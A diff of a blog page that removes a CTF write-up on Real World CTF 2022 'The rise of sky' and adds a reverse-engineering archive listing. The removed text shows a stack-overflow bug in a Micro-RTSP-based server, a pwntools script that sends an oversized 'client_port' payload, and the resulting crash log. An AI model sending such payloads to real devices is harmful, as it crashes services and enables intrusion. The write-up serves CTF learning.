@@ -5,31 +5,23 @@
 	<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 	<!-- This site is optimized with the Yoast SEO plugin v19.9 - https://yoast.com/wordpress/plugins/seo/ -->
-	<title>Realworld CTF 2022 &quot;The rise of sky&quot; writeup - Hopeless blog</title>
-	<meta name="description" content="Interesting challenge with CSKY cpu and weird arch mcore in RWCTF 2022">
-	<link rel="canonical" href="https://pwnblog.github.io/2022/02/09/realworld-ctf-the-rise-of-sky-writeup/">
+	<title>reverse-engineering Archives - Hopeless blog</title>
+	<link rel="canonical" href="https://pwnblog.github.io/category/rev/">
 	<meta property="og:locale" content="en_US">
 	<meta property="og:type" content="article">
-	<meta property="og:title" content="Realworld CTF 2022 &quot;The rise of sky&quot; writeup - Hopeless blog">
-	<meta property="og:description" content="Interesting challenge with CSKY cpu and weird arch mcore in RWCTF 2022">
-	<meta property="og:url" content="https://pwnblog.github.io/2022/02/09/realworld-ctf-the-rise-of-sky-writeup/">
+	<meta property="og:title" content="reverse-engineering Archives - Hopeless blog">
+	<meta property="og:description" content="Life is boring without reverse-engineering">
+	<meta property="og:url" content="https://pwnblog.github.io/category/rev/">
 	<meta property="og:site_name" content="Hopeless blog">
-	<meta property="article:published_time" content="2022-02-09T15:27:15+00:00">
-	<meta property="article:modified_time" content="2022-02-15T14:49:09+00:00">
-	<meta property="og:image" content="https://pwnblog.github.io/wp-content/uploads/2022/02/image.png">
-	<meta name="author" content="rookie">
 	<meta name="twitter:card" content="summary_large_image">
-	<meta name="twitter:label1" content="Written by">
-	<meta name="twitter:data1" content="rookie">
-	<meta name="twitter:label2" content="Est. reading time">
-	<meta name="twitter:data2" content="12 minutes">
-	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://pwnblog.github.io/2022/02/09/realworld-ctf-the-rise-of-sky-writeup/#article","isPartOf":{"@id":"https://pwnblog.github.io/2022/02/09/realworld-ctf-the-rise-of-sky-writeup/"},"author":{"name":"rookie","@id":"https://pwnblog.github.io/#/schema/person/ec54b174962c98c5789c4f712e28bba6"},"headline":"Realworld CTF 2022 “The rise of sky” writeup","datePublished":"2022-02-09T15:27:15+00:00","dateModified":"2022-02-15T14:49:09+00:00","mainEntityOfPage":{"@id":"https://pwnblog.github.io/2022/02/09/realworld-ctf-the-rise-of-sky-writeup/"},"wordCount":1078,"publisher":{"@id":"https://pwnblog.github.io/#/schema/person/ec54b174962c98c5789c4f712e28bba6"},"image":{"@id":"https://pwnblog.github.io/2022/02/09/realworld-ctf-the-rise-of-sky-writeup/#primaryimage"},"thumbnailUrl":"https://pwnblog.github.io/wp-content/uploads/2022/02/image.png","articleSection":["writeups"],"inLanguage":"en-US"},{"@type":"WebPage","@id":"https://pwnblog.github.io/2022/02/09/realworld-ctf-the-rise-of-sky-writeup/","url":"https://pwnblog.github.io/2022/02/09/realworld-ctf-the-rise-of-sky-writeup/","name":"Realworld CTF 2022 \"The rise of sky\" writeup - Hopeless blog","isPartOf":{"@id":"https://pwnblog.github.io/#website"},"primaryImageOfPage":{"@id":"https://pwnblog.github.io/2022/02/09/realworld-ctf-the-rise-of-sky-writeup/#primaryimage"},"image":{"@id":"https://pwnblog.github.io/2022/02/09/realworld-ctf-the-rise-of-sky-writeup/#primaryimage"},"thumbnailUrl":"https://pwnblog.github.io/wp-content/uploads/2022/02/image.png","datePublished":"2022-02-09T15:27:15+00:00","dateModified":"2022-02-15T14:49:09+00:00","description":"Interesting challenge with CSKY cpu and weird arch mcore in RWCTF 2022","breadcrumb":{"@id":"https://pwnblog.github.io/2022/02/09/realworld-ctf-the-rise-of-sky-writeup/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://pwnblog.github.io/2022/02/09/realworld-ctf-the-rise-of-sky-writeup/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https://pwnblog.github.io/2022/02/09/realworld-ctf-the-rise-of-sky-writeup/#primaryimage","url":"https://pwnblog.github.io/wp-content/uploads/2022/02/image.png","contentUrl":"https://pwnblog.github.io/wp-content/uploads/2022/02/image.png","width":670,"height":156},{"@type":"BreadcrumbList","@id":"https://pwnblog.github.io/2022/02/09/realworld-ctf-the-rise-of-sky-writeup/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://pwnblog.github.io/"},{"@type":"ListItem","position":2,"name":"Realworld CTF 2022 “The rise of sky” writeup"}]},{"@type":"WebSite","@id":"https://pwnblog.github.io/#website","url":"https://pwnblog.github.io/","name":"Hopeless blog","description":"Pwn the life","publisher":{"@id":"https://pwnblog.github.io/#/schema/person/ec54b174962c98c5789c4f712e28bba6"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://pwnblog.github.io/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":["Person","Organization"],"@id":"https://pwnblog.github.io/#/schema/person/ec54b174962c98c5789c4f712e28bba6","name":"rookie","logo":{"@id":"https://pwnblog.github.io/#/schema/person/image/"},"sameAs":["https://pwnblog.github.io"],"url":"https://pwnblog.github.io/author/hopeless/"}]}</script>
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"CollectionPage","@id":"https://pwnblog.github.io/category/rev/","url":"https://pwnblog.github.io/category/rev/","name":"reverse-engineering Archives - Hopeless blog","isPartOf":{"@id":"https://pwnblog.github.io/#website"},"breadcrumb":{"@id":"https://pwnblog.github.io/category/rev/#breadcrumb"},"inLanguage":"en-US"},{"@type":"BreadcrumbList","@id":"https://pwnblog.github.io/category/rev/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://pwnblog.github.io/"},{"@type":"ListItem","position":2,"name":"reverse-engineering"}]},{"@type":"WebSite","@id":"https://pwnblog.github.io/#website","url":"https://pwnblog.github.io/","name":"Hopeless blog","description":"Pwn the life","publisher":{"@id":"https://pwnblog.github.io/#/schema/person/ec54b174962c98c5789c4f712e28bba6"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://pwnblog.github.io/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":["Person","Organization"],"@id":"https://pwnblog.github.io/#/schema/person/ec54b174962c98c5789c4f712e28bba6","name":"rookie","logo":{"@id":"https://pwnblog.github.io/#/schema/person/image/"},"sameAs":["https://pwnblog.github.io"]}]}</script>
 	<!-- / Yoast SEO plugin. -->
 
 
 <link rel="dns-prefetch" href="//s.w.org">
 <link rel="alternate" type="application/rss+xml" title="Hopeless blog &raquo; Feed" href="https://pwnblog.github.io/feed/">
 <link rel="alternate" type="application/rss+xml" title="Hopeless blog &raquo; Comments Feed" href="https://pwnblog.github.io/comments/feed/">
+<link rel="alternate" type="application/rss+xml" title="Hopeless blog &raquo; reverse-engineering Category Feed" href="https://pwnblog.github.io/category/rev/feed/">
 <script>
 window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/pwnblog.github.io\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.0.3"}};
 /*! This file is auto-generated */
@@ -55,16 +47,13 @@ img.emoji {
 <style id="hcb-style-inline-css">:root{--hcb-font-size: 14px}:root{--hcb-font-size--mobile: 13px}:root{--hcb-font-family:Menlo, Consolas, "Hiragino Kaku Gothic ProN", "Hiragino Sans", Meiryo, sans-serif;}</style>
 <link rel="stylesheet" id="hcb-coloring-css" href="https://pwnblog.github.io/wp-content/plugins/highlighting-code-block/build/css/coloring_light.css?ver=1.6.0" media="all">
 <link rel="https://api.w.org/" href="https://pwnblog.github.io/wp-json/">
-<link rel="alternate" type="application/json" href="https://pwnblog.github.io/wp-json/wp/v2/posts/30">
+<link rel="alternate" type="application/json" href="https://pwnblog.github.io/wp-json/wp/v2/categories/4">
 <link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://pwnblog.github.io/xmlrpc.php?rsd">
 <link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://pwnblog.github.io/wp-includes/wlwmanifest.xml"> 
 <meta name="generator" content="WordPress 6.0.3">
-<link rel="shortlink" href="https://pwnblog.github.io/?p=30">
-<link rel="alternate" type="application/json+oembed" href="https://pwnblog.github.io/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fpwnblog.github.io%2F2022%2F02%2F09%2Frealworld-ctf-the-rise-of-sky-writeup%2F">
-<link rel="alternate" type="text/xml+oembed" href="https://pwnblog.github.io/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fpwnblog.github.io%2F2022%2F02%2F09%2Frealworld-ctf-the-rise-of-sky-writeup%2F&#038;format=xml">
 </head>
 
-<body class="post-template-default single single-post postid-30 single-format-standard wp-embed-responsive right-sidebar nav-float-right separate-containers header-aligned-left dropdown-hover" itemtype="https://schema.org/Blog" itemscope>
+<body class="archive category category-rev category-4 wp-embed-responsive right-sidebar nav-float-right separate-containers header-aligned-left dropdown-hover" itemtype="https://schema.org/Blog" itemscope>
 	<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-dark-grayscale"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tablevalues="0 0.49803921568627"></fefuncr><fefuncg type="table" tablevalues="0 0.49803921568627"></fefuncg><fefuncb type="table" tablevalues="0 0.49803921568627"></fefuncb><fefunca type="table" tablevalues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-grayscale"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tablevalues="0 1"></fefuncr><fefuncg type="table" tablevalues="0 1"></fefuncg><fefuncb type="table" tablevalues="0 1"></fefuncb><fefunca type="table" tablevalues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-purple-yellow"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tablevalues="0.54901960784314 0.98823529411765"></fefuncr><fefuncg type="table" tablevalues="0 1"></fefuncg><fefuncb type="table" tablevalues="0.71764705882353 0.25490196078431"></fefuncb><fefunca type="table" tablevalues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-blue-red"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tablevalues="0 1"></fefuncr><fefuncg type="table" tablevalues="0 0.27843137254902"></fefuncg><fefuncb type="table" tablevalues="0.5921568627451 0.27843137254902"></fefuncb><fefunca type="table" tablevalues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-midnight"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tablevalues="0 0"></fefuncr><fefuncg type="table" tablevalues="0 0.64705882352941"></fefuncg><fefuncb type="table" tablevalues="0 1"></fefuncb><fefunca type="table" tablevalues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-magenta-yellow"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tablevalues="0.78039215686275 1"></fefuncr><fefuncg type="table" tablevalues="0 0.94901960784314"></fefuncg><fefuncb type="table" tablevalues="0.35294117647059 0.47058823529412"></fefuncb><fefunca type="table" tablevalues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-purple-green"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tablevalues="0.65098039215686 0.40392156862745"></fefuncr><fefuncg type="table" tablevalues="0 1"></fefuncg><fefuncb type="table" tablevalues="0.44705882352941 0.4"></fefuncb><fefunca type="table" tablevalues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-blue-orange"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tablevalues="0.098039215686275 1"></fefuncr><fefuncg type="table" tablevalues="0 0.66274509803922"></fefuncg><fefuncb type="table" tablevalues="0.84705882352941 0.41960784313725"></fefuncb><fefunca type="table" tablevalues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><a class="screen-reader-text skip-link" href="#content" title="Skip to content">Skip to content</a>		<header class="site-header has-inline-mobile-toggle" id="masthead" aria-label="Site" itemtype="https://schema.org/WPHeader" itemscope>
 			<div class="inside-header grid-container">
 				<div class="site-branding">
@@ -96,709 +85,27 @@ img.emoji {
 			
 	<div class="content-area" id="primary">
 		<main class="site-main" id="main">
+					<header class="page-header" aria-label="Page">
 			
-<article id="post-30" class="post-30 post type-post status-publish format-standard hentry category-writeups" itemtype="https://schema.org/CreativeWork" itemscope>
+			<h1 class="page-title">
+				reverse-engineering			</h1>
+
+			<div class="taxonomy-description">
+<p>Life is boring without reverse-engineering</p>
+</div>		</header>
+		<article id="post-117" class="post-117 post type-post status-publish format-standard hentry category-rev" itemtype="https://schema.org/CreativeWork" itemscope>
 	<div class="inside-article">
 					<header class="entry-header" aria-label="Content">
-				<h1 class="entry-title" itemprop="headline">Realworld CTF 2022 &#8220;The rise of sky&#8221; writeup</h1>		<div class="entry-meta">
-			<span class="posted-on"><time class="updated" datetime="2022-02-15T14:49:09+00:00" itemprop="dateModified">February 15, 2022</time><time class="entry-date published" datetime="2022-02-09T15:27:15+00:00" itemprop="datePublished">February 9, 2022</time></span> <span class="byline">by <span class="author vcard" itemprop="author" itemtype="https://schema.org/Person" itemscope><a class="url fn n" href="https://pwnblog.github.io/author/hopeless/" title="View all posts by rookie" rel="author" itemprop="url"><span class="author-name" itemprop="name">rookie</span></a></span></span> 		</div>
+				<h2 class="entry-title" itemprop="headline"><a href="https://pwnblog.github.io/2022/10/28/genshin-impact-server-reverse-engineering-part-1-artifacts/" rel="bookmark">Genshin Impact Server Reverse-Engineering Part 1: Artifacts</a></h2>		<div class="entry-meta">
+			<span class="posted-on"><time class="entry-date published" datetime="2022-10-28T07:08:53+00:00" itemprop="datePublished">October 28, 2022</time></span> <span class="byline">by <span class="author vcard" itemprop="author" itemtype="https://schema.org/Person" itemscope><a class="url fn n" href="https://pwnblog.github.io/author/hopeless/" title="View all posts by rookie" rel="author" itemprop="url"><span class="author-name" itemprop="name">rookie</span></a></span></span> 		</div>
 					</header>
 			
-		<div class="entry-content" itemprop="text">
-			
-<h2 id="0x1-challenge-accepted">0x1 Challenge accepted</h2>
-
-
-
-<p>We&#8217;re given a small compressed file, the first thing to do is throw it in binwalk :).</p>
-
-
-
-<script id="asciicast-XUTc1rW9IWiaNgaHusECGU96z" src="https://asciinema.org/a/XUTc1rW9IWiaNgaHusECGU96z.js" async="" data-rows="20" data-cols="100"></script>
-
-
-
-<p>Looks like a iot system image packed with CramFS, we gotta install some cramfs tools in order to unpack this file. </p>
-
-
-
-<div class="hcb_wrap"><pre class="prism line-numbers lang-bash" data-lang="Bash"><code>apt install cramfsprogs</code></pre></div>
-
-
-
-<p><em>spoiler: binwalk -e <strong>sucks</strong></em>, <em>although it can unpack this image, you won&#8217;t get all files inside it, binwalk stops nowhere and idk why.</em></p>
-
-
-
-<script id="asciicast-2y43V2hCdi2PoX6qAKfWWalFt" src="https://asciinema.org/a/2y43V2hCdi2PoX6qAKfWWalFt.js" async=""></script>
-
-
-
-<p>OK, you may wonder why we need sudo to extract the image? Simply because image contains some symbol link to /proc/self/mem or other root stuff that we have to sudo to extract. </p>
-
-
-
-<p>Well you don&#8217;t see anything interesting besides a demo.mjpeg and a fake flag file, <strong>where is the target binary</strong>?</p>
-
-
-
-<h2 id="0x2-enemy-spotted">0x2 Enemy spotted</h2>
-
-
-
-<p>Target server is actually at <strong>/usr/bin/server</strong>! </p>
-
-
-
-<p>Let&#8217;s pull that out and fire up IDA! Oh&#8230; wait..</p>
-
-
-
-<figure class="wp-block-image size-full"><img width="670" height="156" src="https://pwnblog.github.io/wp-content/uploads/2022/02/image.png" alt="" class="wp-image-51" srcset="https://pwnblog.github.io/wp-content/uploads/2022/02/image.png 670w, https://pwnblog.github.io/wp-content/uploads/2022/02/image-300x70.png 300w" sizes="(max-width: 670px) 100vw, 670px"></figure>
-
-
-
-<p>WTF is mcore? I never heard that before, after some some google fu, I found something in <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/M%C2%B7CORE" target="_blank">wikipedia</a>.</p>
-
-
-
-<p>Looks like only c-sky cpu can fully support this weird thing, so wtf is c-sky cpu?</p>
-
-
-
-<p>C-SKY cpu arch actually has a somewhat nice <a rel="noreferrer noopener" href="https://c-sky.github.io/" target="_blank">github page here</a>. you can check more information in there website but the most important part is they have a buildroot for this arch!</p>
-
-
-
-<p><a rel="noreferrer noopener" href="https://github.com/c-sky/buildroot/releases" target="_blank">In this github release page</a> you&#8217;ll find some buildroot releases, I choose &#8220;c810/807 linux-5.10&#8221; one.</p>
-
-
-
-<p>Download and unpack everything from gitlab artifacts, and ?</p>
-
-
-
-<p><strong>READ THE FUCKING README.TXT FIRST</strong></p>
-
-
-
-<p>well there&#8217;s a readme_advanced.txt, I highly suggest you read that file too.</p>
-
-
-
-<h2 id="0x3-testing-server">0x3 Testing server</h2>
-
-
-
-<p>Since our lovely ida refuses to load this binary just like every girl I like refuses me, I decided to just run this binary first and see how it goes.</p>
-
-
-
-<p>In readme_advanced.txt, we actually can run this custom qemu image with network support which is very import for debugging.</p>
-
-
-
-<p>Everything we need is in the unpacked folder we downloaded in step 2, including gdb/gdbserver/qemu.</p>
-
-
-
-<p>Copy gdbserver , our target server and demo.mpeg into new qemu machine:</p>
-
-
-
-<script id="asciicast-asFrrLX03XDwpnQqHnrpX8Qhb" src="https://asciinema.org/a/asFrrLX03XDwpnQqHnrpX8Qhb.js" async="" data-speed="2"></script>
-
-
-
-<p>Fire up qemu with network support:</p>
-
-
-
-<div class="hcb_wrap"><pre class="prism line-numbers lang-bash" data-lang="Bash"><code>./host/csky-qemu/bin/qemu-system-cskyv2 -M virt -cpu c810v -kernel Image -nographic -append &quot;console=ttyS0,115200 rdinit=/sbin/init rootwait root=/dev/vda ro&quot; -drive file=rootfs.ext2,format=raw,id=hd0 -device virtio-blk-device,drive=hd0 -netdev tap,script=no,id=net0 -device virtio-net-device,netdev=net0</code></pre></div>
-
-
-
-<p>Setting correct ip address in <strong>host</strong>:</p>
-
-
-
-<div class="hcb_wrap"><pre class="prism line-numbers lang-bash" data-lang="Bash"><code>sudo ifconfig tap0 192.168.101.200</code></pre></div>
-
-
-
-<p>Setting correct ip address in <strong>qemu guest</strong>:</p>
-
-
-
-<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code>ifconfig eth0 192.168.101.23</code></pre></div>
-
-
-
-<p><em>Technically you can set whatever ip address you want but I&#8217;ll go with this for now.</em></p>
-
-
-
-<p>But wait, how to run the server? Let&#8217;s go back to challenge image folder and grep the server path, there should be some script that launches the server, we can guess correct parameters there.</p>
-
-
-
-<script id="asciicast-wWQ7GoYGHDrW5QWwEB8zBozJY" src="https://asciinema.org/a/wWQ7GoYGHDrW5QWwEB8zBozJY.js" async=""></script>
-
-
-
-<p>Got it, the correct command line should be:</p>
-
-
-
-<div class="hcb_wrap"><pre class="prism line-numbers lang-bash" data-lang="Bash"><code>./server demo.mjpeg 800 450</code></pre></div>
-
-
-
-<p>The two number should be width and height of the rdsp stream, which is actually width and height of demo.mjpeg.</p>
-
-
-
-<p>Let&#8217;s run our server inside qemu and see what happens.</p>
-
-
-
-<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code># ./server ./demo.mjpeg 800 450 
-running RTSP server
-</code></pre></div>
-
-
-
-<p>Hmm nothing interesting, it should listen on some port, let&#8217;s run server in background and check netstat.</p>
-
-
-
-<div class="hcb_wrap"><pre class="prism line-numbers lang-bash" data-lang="Bash"><code># ./server ./demo.mjpeg 800 450 &
-# running RTSP server
-
-# netstat -an
-Active Internet connections (servers and established)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       
-tcp        0      0 0.0.0.0:8554            0.0.0.0:*               LISTEN      
-netstat: /proc/net/tcp6: No such file or directory
-netstat: /proc/net/udp6: No such file or directory
-netstat: /proc/net/raw6: No such file or directory
-Active UNIX domain sockets (servers and established)
-Proto RefCnt Flags       Type       State         I-Node Path
-netstat: /proc/net/unix: bogus data on line 2
-netstat: /proc/net/unix: bogus data on line 3</code></pre></div>
-
-
-
-<p>See that 8554? That&#8217;s our sweet port.</p>
-
-
-
-<p>But how exactly can we connect to this port? What protocol can we use?</p>
-
-
-
-<h2 id="0x4-darkness-of-rtsp">0x4 Darkness of RTSP</h2>
-
-
-
-<p>After no luck in reversing and port connection, I decided to turn my eyes on actual target server hosted by RWCTF.</p>
-
-
-
-<p>Since I cannot reproduce this part because CTF server is closed, I&#8217;ll just let you know that platform server port will return a rtsp url after inputting your team token, and we can actually view it with VLC :).</p>
-
-
-
-<figure class="wp-block-image size-full"><img loading="lazy" width="802" height="565" src="https://pwnblog.github.io/wp-content/uploads/2022/02/image-1.png" alt="" class="wp-image-61" srcset="https://pwnblog.github.io/wp-content/uploads/2022/02/image-1.png 802w, https://pwnblog.github.io/wp-content/uploads/2022/02/image-1-300x211.png 300w, https://pwnblog.github.io/wp-content/uploads/2022/02/image-1-768x541.png 768w" sizes="(max-width: 802px) 100vw, 802px"></figure>
-
-
-
-<p>Nothing interesting here, but we can reuse this url to make similar requests to our testing server.</p>
-
-
-
-<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code>vlc -v rtsp://192.168.101.23:8554/mjpeg/1</code></pre></div>
-
-
-
-<p>And you should see something like this in qemu:</p>
-
-
-
-<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code># ./server ./demo.mjpeg 800 450 &
-# running RTSP server
-
-# Client connected. Client address: 192.168.101.200
-Creating TSP streamer
-file streamer constructor
-Creating RTSP session
-RTSP received OPTIONS
-RTSP received DESCRIBE
-RTSP received SETUP
-RTSP received PLAY
-file streamer streamImage
-....</code></pre></div>
-
-
-
-<p>So now what? </p>
-
-
-
-<p>In this type of CTF, I highly doubt they write a fresh rtsp server from scratch, so I searched some strings in Github and eventually I found <a rel="noreferrer noopener" href="https://github.com/geeksville/Micro-RTSP" target="_blank">this repo.</a></p>
-
-
-
-<p>And this file <a href="https://github.com/geeksville/Micro-RTSP/blob/master/src/CRtspSession.cpp#L65" target="_blank" rel="noreferrer noopener">https://github.com/geeksville/Micro-RTSP/blob/master/src/CRtspSession.cpp#L65</a>.</p>
-
-
-
-<p>I can confirm this challenge borrow some code from this repo with 99% confidence, look at how similar the strings are, guys.</p>
-
-
-
-<p>That BIG strcpy is super interesting at first glance, and indeed this is a stack overflow bug!</p>
-
-
-
-<p>Let&#8217;s test this bug in our testing server and see if it exists!</p>
-
-
-
-<h2 id="0x5-overflow-the-sky">0x5 Overflow the sky</h2>
-
-
-
-<p>We must have string &#8220;client_port&#8221; in our packet of course, but that&#8217;s not enough.</p>
-
-
-
-<p>In line 402 of source code:</p>
-
-
-
-<div class="hcb_wrap"><pre class="prism line-numbers lang-c" data-lang="C"><code>    int res = socketread(m_RtspClient,RecvBuf,sizeof(RecvBuf), readTimeoutMs);
-    if(res &gt; 0) {
-        // we filter away everything which seems not to be an RTSP command: O-ption, D-escribe, S-etup, P-lay, T-eardown
-        if ((RecvBuf[0] == &#39;O&#39;) || (RecvBuf[0] == &#39;D&#39;) || (RecvBuf[0] == &#39;S&#39;) || (RecvBuf[0] == &#39;P&#39;) || (RecvBuf[0] == &#39;T&#39;))
-        {
-            RTSP_CMD_TYPES C = Handle_RtspRequest(RecvBuf,res);
-            if (C == RTSP_PLAY)
-                m_streaming = true;
-            else if (C == RTSP_TEARDOWN)
-                m_stopped = true;
-        }</code></pre></div>
-
-
-
-<p>Here it checks if first byte of tcp packet is &#8220;O&#8221;,&#8221;D&#8221;,&#8221;S&#8221;,&#8221;P&#8221; or &#8220;T&#8221;, if check fails server won&#8217;t handle it as rtsp packet.</p>
-
-
-
-<p>And the actual bug code:</p>
-
-
-
-<div class="hcb_wrap"><pre class="prism line-numbers lang-c" data-lang="C"><code>    char * ClientPortPtr;
-    char * TmpPtr;
-    static char CP[1024];
-...
-    ClientPortPtr = strstr(CurRequest,&quot;client_port&quot;);
-    if (ClientPortPtr != nullptr)
-    {
-        TmpPtr = strstr(ClientPortPtr,&quot;\r\n&quot;);
-        if (TmpPtr != nullptr)
-        {
-            TmpPtr[0] = 0x00;
-            strcpy(CP,ClientPortPtr);
-...</code></pre></div>
-
-
-
-<p>Here it checks if request packet have string &#8220;client_port&#8221; or not, and simply copy <strong>ANYTHING </strong>after &#8220;client_port&#8221; till &#8220;\r\n&#8221; to variable CP, which resides in <strong>STACK</strong>.</p>
-
-
-
-<p>Time to craft our testing script.</p>
-
-
-
-<div class="hcb_wrap"><pre class="prism line-numbers lang-python" data-lang="Python"><code>from pwn import *
-
-debug = 1
-context.log_level = &#39;debug&#39;
-
-if debug:
-    p = remote(&#39;192.168.101.23&#39;, 8554)
-else:
-    p = remote(&#39;47.242.246.203&#39;, 32042)
-
-test = b&#39;Oclient_port&#39; + b&#39;a&#39; * 2000 + b&#39;\r\n&#39;
-
-p.send(test)
-# p.sendline(test)
-p.interactive()</code></pre></div>
-
-
-
-<p>And server crashed!</p>
-
-
-
-<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code>[ 3167.446179] server[124]: unhandled signal 11 code 0x1 at 0x61616000
-[ 3167.449816] 
-[ 3167.449816] CURRENT PROCESS:
-[ 3167.449816] 
-[ 3167.450191] COMM=server PID=124
-[ 3167.450447] TEXT=00008000-00138090 DATA=0013976c-0013f4e8 BSS=0013f4e8-01b75000
-[ 3167.450899] USER-STACK=7f860e60  KERNEL-STACK=817a7700
-[ 3167.450899] 
-[ 3167.451604] PC: 0x61616160 (0x61616160)
-[ 3167.451872] LR: 0x61616161 (0x61616161)
-[ 3167.452362] SP: 0x7f860800
-[ 3167.452550] PSR: 0x00140341
-[ 3167.452958] orig_a0: 0x00000000
-[ 3167.453129] PT_REGS: 0x817eff68
-[ 3167.453380]  a0: 0x00000000   a1: 0x00000000   a2: 0x00163568   a3: 0x00000000
-[ 3167.453739]  r4: 0x61616161   r5: 0x00000320   r6: 0x00000000   r7: 0x00000000
-[ 3167.454170]  r8: 0x61616161   r9: 0x0053e45c  r10: 0x000ec6fc  r11: 0x00000001
